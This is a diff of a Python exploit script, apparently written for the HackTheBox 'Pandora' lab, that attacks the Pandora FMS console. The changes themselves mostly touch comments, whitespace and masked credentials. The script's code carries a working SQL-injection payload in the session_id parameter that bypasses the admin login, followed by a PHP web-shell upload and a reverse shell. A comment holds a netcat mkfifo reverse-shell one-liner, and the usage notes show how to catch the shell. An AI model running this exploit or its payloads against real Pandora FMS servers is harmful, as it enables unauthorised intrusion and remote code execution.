@@ -9,24 +9,29 @@ import requests
 # + Spawn a reverse shell
 # Author: @nightwolfx2
 
-# Pre-requisites:
-# + Run an SSH Local tunnel to 127.0.0.1 port 80 to be able to reach pandora console as is only accesible from the inside.
-#   Example:
-#   ssh -L 9090:127.0.0.1:80 <username>@pandora.htb 
-#
 # Help articles:
 # + How to exploit error based SQL Injections -> https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
 # + Reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x yyyy >/tmp/f
 
+# Pre-Requisites:
+#
+# Running a Local SSH tunnel to the remote box as d***** user. Example:
+# └─$ ssh -L 9090:127.0.0.1:80 d*****@10.10.11.136
+# d******@10.10.11.136's password: 
+# Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+#
+#  * Documentation:  https://help.ubuntu.com
+#  * Management:     https://landscape.canonical.com
+#
 # Usage:
 # On a separated terminal, start a netcat listener, example:
 # $nc -l -p 9999 -v
 #
 # Run the exploit as follows:
-# └─$ python3 pandora.py -t 127.0.0.1 -p 9090 -a 10.10.14.2 -l 9999
+# └─$ python3 pandora.py -t 127.0.0.1 -p 9090 -a xx.xx.xx.xx -l yyyy
 # [+] Successfully bypassed admin restrictions
 # [+] eaea.php shell has been uploaded successfully
-#
+# 
 # Enjoy the reverse shell :)
 
 PROXIES = {
@@ -74,7 +79,7 @@ def bypass_admin(full_target, id, session):
     #http://127.0.0.1:9090/pandora_console/include/chart_generator.php?session_id=%27/**/union/**/SELECT/**/1,2,%27id_usuario|s:5:%22admin%22;%27/**/endof%23
     url = "http://%s/pandora_console/include/chart_generator.php?session_id=%%27/**/union/**/SELECT/**/1,2,%%27id_usuario|s:%s:%%22admin%%22;%%27/**/endof%%23" % (full_target, id)
     res = session.get(url)
-
+    
     if "Pandora FMS Graph ( - )" in res.text:
         print("[+] Successfully bypassed admin restrictions")
     else:
@@ -97,10 +102,10 @@ def rce(session, full_target, filename, attacker_ip, attacker_port):
     res = session.get(url)
 
 def main():
-        print("--Start--")
+	print("--Start--")
 
 if __name__ == '__main__':
-    session = requests.session()
+    session = requests.session()    
     parser = argparse.ArgumentParser()
     parser.add_argument('-t','--target', help='host/ip to target, required=True')
     parser.add_argument('-p','--port', help='target port, required=True')
@@ -111,10 +116,10 @@ if __name__ == '__main__':
     attacker_ip = args.attacker
     attacker_port = args.listen
     # Examples of how to gather data from DB using Error based SQL injection, not really used in the exploitation...
-    # count=count_session_ids(full_target)
-    # sessions=session_ids(full_target, count)
-    # for i in sessions:
-    #   print(i)
+    #count=count_session_ids(full_target)
+    #sessions=session_ids(full_target, count)
+    #for i in sessions:
+    #    print(i)
     id=get_admin_id(full_target)
     if int(id) != 0:
         bypass_admin(full_target, id, session)
